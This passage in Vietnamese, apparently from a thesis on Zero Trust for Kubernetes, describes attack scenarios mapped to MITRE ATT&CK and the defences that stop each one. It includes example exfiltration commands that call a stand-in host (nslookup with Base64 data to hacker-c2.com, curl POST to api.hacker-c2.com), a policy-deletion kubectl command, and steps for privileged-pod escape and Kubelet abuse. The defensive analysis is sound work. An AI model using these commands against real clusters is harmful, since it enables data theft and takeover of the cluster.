Bị chặn cứng ở tầng Egress HTTP/HTTPS, hacker tinh vi chuyển sang khai thác một lỗ hổng logic về thiết kế kiến trúc: Pod bắt buộc phải được phép truy vấn DNS (cổng UDP/53) tới CoreDNS để tìm kiếm dịch vụ nội bộ. Đây là kênh luôn luôn mở và thường xuyên bị bỏ qua.

Kỹ thuật Đào hầm DNS (DNS Tunneling):

Kẻ tấn công chia nhỏ khối dữ liệu nhạy cảm, mã hóa sang định dạng Base64 và nhét vào phần tiền tố subdomain của truy vấn DNS — ví dụ: nslookup SGVsbG9Xb3JsZA==.hacker-c2.com. CoreDNS của Kubernetes đóng vai trò trung gian, mang truy vấn này đi hỏi các DNS Server cấp cao hơn trên Internet, và dữ liệu cuối cùng đến tận tay Name Server do hacker kiểm soát. Hacker ghép từng đoạn lại thành dữ liệu gốc.

Kỹ thuật này có hai đặc trưng MITRE song hành: dùng DNS làm kênh liên lạc với C2 (T1071.004) đồng thời trích xuất dữ liệu qua giao thức không mã hóa ngoài kênh C2 chuẩn (T1048.003). Dữ liệu bị tuồn ra hoàn toàn vô hình trước các tường lửa L3/L4 thông thường.

Cơ chế phản ứng — Thanh tra L7 và Phân tích hành vi thống kê:

Để đối phó với T1071.004 và T1048.003 qua DNS, hệ thống không thể chỉ kiểm soát ở mức IP/Port mà buộc phải leo lên tầng ứng dụng:

Thanh tra gói tin DNS (L7 Protocol Parsing): CNI Proxy giải mã trực tiếp cấu trúc gói tin UDP cổng 53. Luật mạng được siết chặt: Pod chỉ được phép truy vấn các domain nội bộ (*.cluster.local). Mọi truy vấn hướng ra root domain lạ (*.hacker-c2.com) bị Proxy chặn và trả về mã lỗi REFUSED, cắt đứt khả năng CoreDNS tiếp tay cho T1048.003.

Phân tích hành vi thống kê (Heuristic Monitoring): Trong trường hợp hacker lợi dụng tên miền đám mây hợp lệ làm vỏ bọc, hành vi nhét dữ liệu qua DNS vẫn tạo ra dấu hiệu đặc trưng: hàng loạt bản ghi lỗi NXDOMAIN, độ dài subdomain bất thường, và Query Rate lên cổng 53 tăng đột biến. Bộ giám sát hành vi Runtime thu thập các chỉ số dị thường này, kích hoạt cơ chế giới hạn tốc độ (Rate Limiting) hoặc cô lập mạng Pod để tiến hành điều tra pháp y (Forensics).

+---------------------------------------------------------------------------------+
|                         POD: job-service (BỊ XÂM NHẬP)                          |
|                                                                                 |
|  [ Dữ liệu nhạy cảm ]                                                           |
|         |                                                                       |
|         +---(T1041 / T1071.001)---> curl POST http://api.hacker-c2.com          |
|         |                                    |                                  |
|         |                          [ CNI FQDN Egress Filter ]                   |
|         |                          (api.hacker-c2.com: NGOÀI WHITELIST)         |
|         |                                    |                                  |
|         |                          [X] DROP - T1041 bị bẻ gãy                   |
|         |                                                                       |
|         +---(T1048.003 / T1071.004)-> nslookup Base64data.hacker-c2.com         |
|                                                |                                |
|                               [ CoreDNS / CNI DNS Proxy L7 ]                    |
|                               Phân tích cấu trúc gói UDP/53:                    |
|                               - Root domain lạ: hacker-c2.com                   |
|                               - Subdomain length: BẤT THƯỜNG                    |
|                               - Query rate: TĂNG ĐỘT BIẾN                       |
|                                                |                                |
|                               [X] REFUSED - T1048.003 bị bẻ gãy                 |
|                                                |                                |
|                                                v                                |
|                               [ Log: DNS Policy Denied ]                        |
|                               [ Heuristic Alert kích hoạt ]                     |
|                               [ CÔ LẬP MẠNG POD ]                               |
+---------------------------------------------------------------------------------+
Kịch bản 7: Thỏa hiệp chuỗi cung ứng, Lạm dụng đặc quyền API và Vượt rào Cổng nạp (Admission Control)

(MITRE ATT&CK Containers Matrix — Tactics: Persistence - TA0003, Privilege Escalation - TA0004 & Defense Evasion - TA0005)

Bề mặt tấn công: Mặt phẳng điều khiển Kubernetes (API Server), hệ thống ServiceAccount và Quy trình nạp Image (Image Pulling). Giả định tác nhân đe dọa đang có quyền thực thi trong một Pod nghiệp vụ và nhận ra các đường mạng Đông-Tây, Bắc-Nam đều bị Cilium khóa chặt. Chúng quyết định chuyển hướng tấn công trực tiếp vào trái tim của cụm: Kubernetes API Server.

Giai đoạn 1: Lạm dụng danh tính Workload và Nỗ lực triển khai mã độc

(MITRE Kỹ thuật: Valid Accounts: Local Accounts - T1078.003, Deploy Container - T1610, Escape to Host - T1611 & Supply Chain Compromise - T1195.002)

Chiến thuật của Tác nhân đe dọa: Để duy trì sự hiện diện lâu dài mà không phụ thuộc vào một Pod dễ bay hơi, hacker tìm cách khởi tạo một Pod hoàn toàn mới do chúng tự kiểm soát.

Xâm nhập:
Trong các cấu hình chưa được siết chặt an ninh (không khai báo tường minh automountServiceAccountToken: false), Kubernetes Kubelet mặc định vẫn tự động tiêm một ServiceAccount token vào Pod tại /var/run/secrets/kubernetes.io/serviceaccount. Kẻ tấn công trích xuất token này (T1078.003) và sử dụng nó để gửi các lệnh REST API đến Kubernetes API Server nội bộ (https://kubernetes.default.svc).

Giả định do một sai sót luận lý trong quá trình phân quyền (RBAC Misconfiguration), ServiceAccount này có đặc quyền CREATE pods. Hacker chớp thời cơ, yêu cầu API Server khởi tạo một Pod mới sử dụng Image chứa backdoor đã được chúng đẩy lên Registry (T1195.002 - Image Poisoning).

Tinh vi hơn, để chiếm quyền Node vật lý, chúng khai báo cờ privileged: true và mount thư mục gốc (/) của Node chủ vào bên trong Pod hòng chui ra ngoài (T1611). Đây là kỹ thuật Deploy Container (T1610) kết hợp Escape to Host kinh điển từng được ghi nhận trong nhiều sự cố thực tế (như vụ Tesla 2018).

Giai đoạn 2: Bản chất của Pipeline API Server — Từ chối khởi tạo qua Validating Webhooks

(MITRE Kỹ thuật: T1610, T1611, T1195.002 — Bị bẻ gãy tại pha Admission Control)

Hạn chế của kiến trúc Kubernetes tiêu chuẩn:
Nếu chỉ phụ thuộc vào RBAC, API Server chỉ kiểm tra quyền CREATE. Nếu có, nó ghi trạng thái vào etcd và ra lệnh cho Kubelet kéo Image về chạy. Hacker triển khai thành công một container đặc quyền, từ đó chiếm root toàn bộ Node vật lý.

Cơ chế phòng thủ chủ động — Ủy quyền xác thực đa chiều tại Admission Control:
Trong kiến trúc ZTA, việc qua được cửa RBAC chỉ là bước đầu. Mọi yêu cầu ghi vào API Server đều phải đi qua một phễu lọc cuối cùng: Mutating & Validating Admission Webhooks.

Chặn đứng leo thang đặc quyền (T1611): Gói tin tạo Pod bị API Server đẩy sang OPA Gatekeeper. Gatekeeper đối chiếu với chuẩn an ninh Pod Security Standards (PSS) cấp độ Restricted. Khi phát hiện cờ privileged: true và cấu hình hostPath, Gatekeeper lập tức trả về phiếu chống. Lệnh tạo Pod bị từ chối với lỗi HTTP 403 Forbidden.
Chặn đứng Chuỗi cung ứng độc hại (T1610 & T1195.002): Hacker thử bỏ cờ privileged để lách Gatekeeper, chỉ cố chạy Image độc hại. Yêu cầu tiếp tục phải đi qua chốt chặn Sigstore Cosign Policy Controller. Vì Image độc hại không mang Chữ ký mật mã (Cryptographic Signature) hợp lệ được tạo ra bởi Private Key nội bộ (zta-cosign-key), Sigstore dứt khoát từ chối nạp Image.
Giai đoạn 3: Tấn công làm mù Webhook và Kỹ thuật thay thế Image (Tag Mutability)

(MITRE Kỹ thuật: Impair Defenses: Disable or Modify Tools - T1562.001 & Supply Chain Compromise - T1195.002)

Đứng trước bức tường Admission Controller, tác nhân đe dọa nhận ra Webhook chính là "cảnh sát cổng". Chúng chuyển sang chiến thuật lẩn tránh và vô hiệu hóa hệ thống phòng thủ.

Kỹ thuật 1: Xóa bỏ ValidatingWebhookConfiguration (T1562.001)

Phương thức: Hacker dùng token gửi API yêu cầu DELETE ValidatingWebhookConfiguration/gatekeeper-validating-webhook. Nếu thành công, Gatekeeper sẽ bị ngắt khỏi API Server, mở toang cửa nạp Pod.
Cơ chế ZTA đáp trả: Nguyên tắc Đặc quyền tối thiểu (Least Privilege). Dù ServiceAccount bị lỗi cấu hình có quyền CREATE pods, nó tuyệt đối không có quyền thao tác trên các tài nguyên cấp Cụm (Cluster-scoped resources). Yêu cầu lập tức bị chặn ở pha RBAC Authorization.

Kỹ thuật 2: Khai thác tính khả biến của Thẻ Image (Tag Mutability Evasion - T1195.002)

Phương thức: Nhận thấy không thể tắt Webhook, hacker sử dụng kỹ thuật T1195.002 ở một phương thức khác: Chúng tự build một Image độc hại, đặt tên và tag y hệt một Image đang chạy hợp lệ (ví dụ job7189/identity:v1), đẩy đè lên Registry nội bộ hòng lừa Kubelet kéo Image độc hại mới này về khi Pod khởi động lại.
Cơ chế ZTA đáp trả (Immutable Digest Validation): Cosign Webhook trong hệ thống Zero Trust không xác thực dựa trên tên Thẻ (Tag). Trong pha Mutating, Sigstore Webhook tự động phân giải tag v1 thành một chuỗi băm bất biến SHA256 Digest (sha256:a1b2c3...) và đính kèm cứng vào tệp cấu hình Pod. Bất kỳ sự thay đổi nội dung Image nào trên Registry đều làm thay đổi hàm băm gốc. Khi Kubelet kéo Image, chữ ký mã hóa sẽ không khớp với nội dung đã bị sửa đổi. Kỹ thuật giả mạo Image thất bại hoàn toàn.
+---------------------------------------------------------------------------------------+
|                    KUBERNETES API SERVER REQUEST LIFECYCLE                            |
|                                                                                       |
|  [ Hacker ] ---(T1078.003: Dùng Token gửi lệnh CREATE Pod / Image: malware)           |
|      |                                                                                |
|      v                                                                                |
|  1. [ Authentication & Authorization (RBAC) ] ---> Hợp lệ (Lỗi cấu hình lọt lưới)     |
|      |                                                                                |
|      v                                                                                |
|  2. [ Mutating Admission Webhook ]                                                    |
|      |-- Sigstore phân giải Tag thành SHA256 Digest (Chống Tag Mutability)            |
|      v                                                                                |
|  3. [ Validating Admission Webhook ]                                                  |
|      |                                                                                |
|      |---> OPA Gatekeeper kiểm tra PSS:                                               |
|      |     Phát hiện cờ privileged: true (T1611) ===> [X] REJECT (HTTP 403)           |
|      |                                                                                |
|      |---> Sigstore Cosign Policy Controller kiểm tra Chữ ký:                         |
|            - Chữ ký public key hợp lệ? KHÔNG.                                         |
|            - Nguồn gốc nội bộ (Provenance)? KHÔNG.                                    |
|            Image độc hại (T1195.002)             ===> [X] REJECT (HTTP 403)           |
|      |                                                                                |
|      v (Nếu mọi thứ đều thất bại)                                                     |
|  [ ETCD Datastore ] (Không bao giờ ghi nhận Pod độc hại, Kubelet không kích hoạt)     |
+---------------------------------------------------------------------------------------+



Kịch bản 8: Khám phá mù, Nghe lén mạng và Thu thập cấu hình cục bộ

(MITRE ATT&CK Containers Matrix — Tactics: Discovery - TA0007, Credential Access - TA0006 & Defense Evasion - TA0005)

Bề mặt tấn công: Cấu trúc mạng nội bộ (Network Topology), siêu dữ liệu của cụm (Cluster Metadata) và không gian mạng cục bộ của Pod. Giả định tác nhân đe dọa đã có quyền thực thi ngầm nhưng hoàn toàn "mù" về vị trí của các dịch vụ lõi (Database, Vault). Chúng bắt buộc phải dò đường.

Giai đoạn 1: Nỗ lực Khám phá chủ động và Tìm kiếm thông tin xác thực

(MITRE Kỹ thuật: Network Service Discovery - T1046, Container and Resource Discovery - T1613, File and Directory Discovery - T1083 & Credentials In Files - T1552.001)

Chiến thuật của Tác nhân đe dọa: Hacker cần xác định tọa độ của các tài nguyên giá trị cao. Chúng thực hiện mũi tấn công thăm dò:

Dò quét mạng (T1046): Sử dụng các công cụ như nmap, chúng quét toàn bộ dải IP của Pod nội bộ để tìm kiếm các cổng mở đặc trưng như 3306 (MySQL) hoặc 8200 (Vault).
Truy vấn Siêu dữ liệu (T1613): Chúng lợi dụng ServiceAccount hiện tại để gửi lệnh GET /api/v1/services đến Kubernetes API Server hòng kết xuất bản đồ dịch vụ của cụm.
Khám phá cấu hình cục bộ (T1083 & T1552.001): Thất bại trong việc nhìn ra bên ngoài, chúng quay lại lục lọi không gian nội bộ của Pod. Hacker dùng script duyệt qua toàn bộ cây thư mục (T1083) nhằm tìm kiếm các file .env hoặc file cấu hình, hòng trích xuất mật khẩu tĩnh bị bỏ quên (T1552.001).
Giai đoạn 2: Bản chất của Phân đoạn vi mô & RBAC Tối thiểu

(MITRE Kỹ thuật: T1046, T1613, T1552.001 — bị vô hiệu hóa bởi eBPF, RBAC và Vault)

Cơ chế phòng thủ chủ động:

Chống dò quét mạng: Trong kiến trúc ZTA, chính sách default-deny-all của Cilium chặn đứng mọi gói tin rà quét. Lệnh nmap hoàn toàn bị Kernel thả rơi (Drop), trả về kết quả Timeout (100% loss).
Khóa chặt Siêu dữ liệu: Yêu cầu list Service/Secrets lập tức bị API Server từ chối bằng mã HTTP 403 Forbidden do vi phạm chuẩn Đặc quyền tối thiểu (Least Privilege).
Triệt tiêu mật khẩu tĩnh: Dù hacker tìm thấy file .env.db, ZTA (thông qua Vault) đảm bảo không có mật khẩu tĩnh nào tồn tại vĩnh viễn (như đã phân tích ở Kịch bản 3), biến nỗ lực thu thập file cấu hình thành công cốc.
Giai đoạn 3: Tấn công Nghe lén Thụ động (Passive Sniffing) hòng Lẩn tránh

(MITRE Kỹ thuật: Network Sniffing - T1040)

Bị "bịt mắt" hoàn toàn và sợ bị phát hiện bởi các rule chủ động (Defense Evasion - TA0005), hacker tải công cụ tcpdump vào Pod, chuyển card mạng ảo eth0 sang chế độ bắt gói tin hỗn tạp (Promiscuous Mode) để hứng các luồng traffic của Pod khác chạy chung trên Node vật lý (T1040).

Cơ chế phản ứng — Tước quyền Kernel & Cô lập Namespace:
Không gian mạng của Pod bị cô lập hoàn toàn (Network Namespace). Quan trọng hơn, thông qua Pod Security Admission, kiến trúc ZTA đã tước bỏ hoàn toàn các Linux Capabilities (như CAP_NET_RAW). Lệnh tcpdump lập tức báo lỗi Operation not permitted. Tác nhân đe dọa bị "nhốt" trong một hộp đen hoàn hảo.





Kịch bản 9: Khai thác Mặt phẳng điều khiển Node (Kubelet API) và Nỗ lực Thoát khỏi Sandbox

(MITRE ATT&CK Containers Matrix — Tactics: Privilege Escalation - TA0004, Credential Access - TA0006 & Lateral Movement - TA0008)

Bề mặt tấn công: Mặt phẳng quản trị cục bộ của máy chủ (Kubelet API) và nhân Hệ điều hành Linux (Linux Kernel). Giả định tác nhân đe dọa đang bị "nhốt" trong Pod job-service, bị mù lòa về mạng nội bộ (như Kịch bản 8) và quyết định tấn công thẳng vào Node vật lý đang chứa Pod đó.

Giai đoạn 1: Dò tìm Default Gateway và Tấn công Kubelet API

(MITRE Kỹ thuật: Network Service Discovery - T1046 & Exploitation of Remote Services - T1210)

Chiến thuật của Tác nhân đe dọa: Hacker nhận ra chúng không thể gọi sang các Pod khác, nhưng mọi Pod đều có một tuyến đường mặc định (Default Route) trỏ về máy chủ Node chứa nó.
Xâm nhập: Chúng kiểm tra bảng định tuyến (ip route) để lấy IP của Node vật lý (ví dụ 10.0.2.15). Sau đó, hacker sử dụng công cụ curl nhắm thẳng vào cổng 10250 — cổng mặc định của Kubelet API (T1046). Mục tiêu của chúng là gửi lệnh GET /pods để đánh cắp siêu dữ liệu và Secret của toàn bộ các Pod khác đang chạy trên cùng Node, hoặc gọi /exec để nhảy sang Pod vault-agent hòng chiếm quyền kiểm soát (T1210).

Giai đoạn 2: Lỗ hổng Kubelet mặc định vs. Phân đoạn vi mô Host-level & Hardening

(MITRE Kỹ thuật: T1046, T1210 — bị vô hiệu hóa bởi Cilium và Kubelet Hardening)

Hạn chế của kiến trúc mặc định: Trong các cụm Kubernetes cài đặt lỏng lẻo, Kubelet thường được cấu hình với cờ anonymousAuth: true. Điều này cho phép bất kỳ ai có thể kết nối đến IP của Node trên cổng 10250 đều có quyền lấy dữ liệu mà không cần xác thực. Hacker sẽ lập tức chiếm trọn Node vật lý.

Cơ chế phòng thủ chủ động — eBPF Egress Filter và CIS Benchmark:

Chặn ở tầng Mạng (Host-level Segmentation): ZTA không có ngoại lệ. Các chính sách CiliumNetworkPolicy áp dụng cho namespace nghiệp vụ không chỉ chặn Pod-to-Pod, mà chặn luôn cả lưu lượng Egress hướng tới dải IP của Host/Node (Ngoại trừ cổng UDP/53 cấp cho CoreDNS). Lệnh curl của hacker hướng đến 10250 của Node bị eBPF thả rơi (Drop) ngay lập tức.
Khóa ở tầng Ứng dụng (Kubelet Hardening): Ngay cả khi hacker tìm được cách lách qua mạng, hạ tầng ZTA tuân thủ chuẩn CIS Benchmark: Kubelet được khởi chạy với cờ --anonymous-auth=false và --authorization-mode=Webhook. Kubelet sẽ yêu cầu Token hợp lệ và chuyển tiếp (delegate) quyền quyết định cho Kubernetes API Server. Lệnh gọi lập tức bị từ chối với HTTP 401 Unauthorized.
Giai đoạn 3: Khai thác lỗ hổng Kernel và Tước quyền Capabilities

(MITRE Kỹ thuật: Escape to Host - T1611)

Bị chặn cứng ở các giao thức API, hacker sử dụng phương thức bạo lực cuối cùng: Khai thác lỗ hổng Zero-day trong Container Runtime (như lỗi Dirty Pipe hoặc runC CVE) để phá vỡ filesystem sandbox, hòng chui thẳng ra hệ điều hành máy chủ (T1611).

Cơ chế phản ứng — Seccomp và Tetragon Syscall Hooking:
Để thực hiện Escape to Host, mã độc bắt buộc phải thực hiện các lời gọi hệ thống (syscall) đặc quyền và bất thường như unshare, ptrace, hoặc mount vào các thư mục cgroup/procfs.

Seccomp Profile (Lớp 1): Pod Security Admission (Restricted) ép buộc Pod chạy với cấu hình RuntimeDefault Seccomp profile, mặc định tước bỏ (block) hàng chục syscall nguy hiểm. Mã khai thác của hacker sẽ bị Kernel từ chối ngay lập tức (EPERM).
Tetragon (Lớp 2): Nếu lỗ hổng nằm ở một syscall được phép, Tetragon sẽ phân tích ngữ cảnh. Khi một tiến trình ứng dụng (như php-fpm) đột ngột có hành vi cấp phát lại bộ nhớ hạt nhân hoặc gắn (mount) không gian tên mới, Tetragon phát hiện sự vi phạm phả hệ và lập tức phát tín hiệu SIGKILL, hạ gục tiến trình ngay tại Kernel Space trước khi nó kịp hoàn thành quá trình vượt ngục.
Kịch bản 10: Thỏa hiệp Hạ tầng như Mã (IaC) và Đầu độc Chính sách Mạng (Policy Drift)

(MITRE ATT&CK Containers Matrix — Tactics: Defense Evasion - TA0005 & Persistence - TA0003)

Bề mặt tấn công: Chuỗi cung ứng CI/CD (GitOps Pipeline), kho lưu trữ mã nguồn Helm và Trạng thái chính sách của cụm. Kịch bản này phản ánh tư duy "Shift-Left" của hacker: Khi Runtime Cluster (Cụm Kubernetes) giống như một pháo đài bất khả xâm phạm, chúng chuyển sang tấn công quy trình triển khai (Management Plane).

Giai đoạn 1: Xâm nhập CI/CD và Đầu độc Chính sách Bảo mật

(MITRE Kỹ thuật: Compromise Software Dependencies and Development Tools - T1195.001 & Impair Defenses: Disable or Modify Cloud Firewall - T1562.007)

Chiến thuật của Tác nhân đe dọa: Kẻ tấn công nhận ra nguyên nhân khiến chúng thất bại ở 9 kịch bản trước đều bắt nguồn từ chính sách default-deny-all của Cilium và các quy tắc OPA.
Xâm nhập: Thông qua việc đánh cắp Access Token của một Developer hoặc tìm ra lỗ hổng trên máy chủ Jenkins/GitLab nội bộ (T1195.001), hacker đẩy một Commit độc hại vào kho lưu trữ (Repository) chứa các file Helm/YAML của hệ thống. Mã độc này khéo léo chỉnh sửa file CiliumNetworkPolicy, mở toang các cổng mạng (0.0.0.0/0) hòng vô hiệu hóa bức tường lửa bảo vệ hệ thống (T1562.007).

Giai đoạn 2: Bản chất của Continuous Deployment vs. Admission Validation

(MITRE Kỹ thuật: T1562.007 — Bị chặn bởi Gatekeeper Validating Webhook)

Hạn chế của kiến trúc CI/CD thuần túy: Trong quy trình CI/CD truyền thống, khi mã được merge vào nhánh chính (main), Pipeline sẽ mù quáng thực thi lệnh kubectl apply hoặc helm upgrade. Chính sách độc hại sẽ được triển khai vào hệ thống, lặng lẽ vô hiệu hóa toàn bộ ZTA mà không sinh ra một log cảnh báo nào.

Cơ chế phòng thủ chủ động — Kiểm duyệt Chính sách bằng Gatekeeper:
Hệ thống ZTA áp dụng nguyên tắc Zero Trust đối với chính luồng triển khai của nó. Khi Pipeline CI/CD cố gắng áp dụng bản cập nhật CiliumNetworkPolicy lên API Server, yêu cầu này phải vượt qua OPA Gatekeeper.
Hệ thống Gatekeeper được cài đặt sẵn một ràng buộc (Constraint) nghiêm ngặt: "Nghiêm cấm tạo hoặc cập nhật bất kỳ NetworkPolicy nào có EndpointSelector trống kết hợp với luật Ingress/Egress dải 0.0.0.0/0 trong các namespace nghiệp vụ". Gatekeeper chặn đứng Commit độc hại này và trả về lỗi, bảo vệ hệ thống khỏi nỗ lực "hạ kính chắn gió" từ bên trong Pipeline.

Giai đoạn 3: Phá hoại thủ công và Vòng lặp Tự phục hồi trạng thái (Auto-recovery / Self-healing)

(MITRE Kỹ thuật: T1562.007 — Thất bại trước cơ chế Reconciliation)

Bị chặn ở Pipeline, hacker quyết định tấn công trực diện. Chúng đánh cắp được file kubeconfig của một quản trị viên dự án và gõ lệnh thủ công trực tiếp vào cụm: kubectl delete cnp default-deny-all -n job7189-apps.

Cơ chế phản ứng — Tự phục hồi và Chống trôi dạt chính sách (Policy Drift Reconciliation):
Hacker thành công trong việc xóa chính sách (do có quyền admin). Tuy nhiên, kiến trúc ZTA sở hữu một "Hệ miễn dịch" tối thượng: Cơ chế Tự phục hồi (Auto-recovery).
Trình điều khiển trạng thái (như GitOps Controller hoặc bộ Script ZTA Rebuild nội bộ đã mô tả ở Chương 3) chạy vòng lặp đối chiếu (Reconciliation loop) liên tục. Nó lập tức phát hiện sự sai lệch (Drift) giữa Trạng thái mong muốn (Desired State) lưu trên Git đã được mã hóa ký số và Trạng thái thực tế (Runtime State) trên Cụm.
Trong vòng vài giây, hệ thống tự động sinh ra hành động vá lỗi: Khởi tạo lại chính xác chính sách default-deny-all đã bị xóa, dập tắt "lỗ thủng" mạng trước khi hacker kịp di chuyển ngang, đồng thời gửi một cảnh báo cấp độ Critical (Mức cao nhất) về SIEM thông báo về sự kiện trôi dạt chính sách.